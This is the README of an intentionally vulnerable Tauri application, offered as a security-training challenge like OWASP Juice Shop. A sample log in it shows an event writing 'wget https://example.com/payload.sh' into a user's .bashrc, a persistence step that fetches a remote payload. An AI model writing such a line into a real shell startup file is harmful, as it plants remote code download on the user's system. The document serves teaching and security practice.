# Broken Navigator

## Disclaimer

This project is an example of a vulnerable application. It contains intentional
vulnerabilities and is meant as educational example.
**Please do not use or copy code from this application in any productive application!**

## Welcome

Welcome fellow travelers of the Tauri galaxy.
We figured you need something to guide you trough your journey, a tool that assures
safe travel at all times.
This is one of the reasons our Navigator was born. Unfortunately we encountered some hurdles
during development of this tool. One of our engineers went missing
during one of our test rides through the galaxy. They were using the Navigator
to orientate themselves in space. The other engineers suspect
they encountered some nasty space hackers, but we can't figure out where
our Navigator was breached. We stopped our engineering efforts until we
can be sure it is safe to use.

We are looking for security engineers to figure out how they breached our
engineers Navigator and how we can protect everyone using it.
Can you help us?

We got some logs transmitted before we lost contact. This could contain
some hints of the initial entrypoint.

```
2023-10-11T08:58:53.795661Z INFO load_navigation_readme{path="/tmp/readme"}: broken_navigator::commands: The Navigator loaded the navigation readme from /tmp/readme!
2023-10-11T08:59:53.799543Z  INFO write_navigation_event{event_data="wget https://example.com/payload.sh" path="/home/user/.bashrc"}: broken_navigator::commands: The space event /home/user/.bashrcc was saved!
```

## Functionality

- Load navigation files from the filesystem
- Write events to the filesystem
- Execute navigation file validation tools
- Load map updates from external map server
- Allows our admin console to fix broken navigation systems
- Provide clipboard assistant when copying coordinates
- ?

## Why is this application a thing?

This application is meant to showcase insecure, weak and improper code pattern commonly used in Tauri applications.
It is meant to be educational and to show newcomers to Rust what they should consider when building
Tauri `commands` or in general Tauri applications.

A similar project is the [OWASP Juice Shop](), which is focused on web applications running
in the browser.
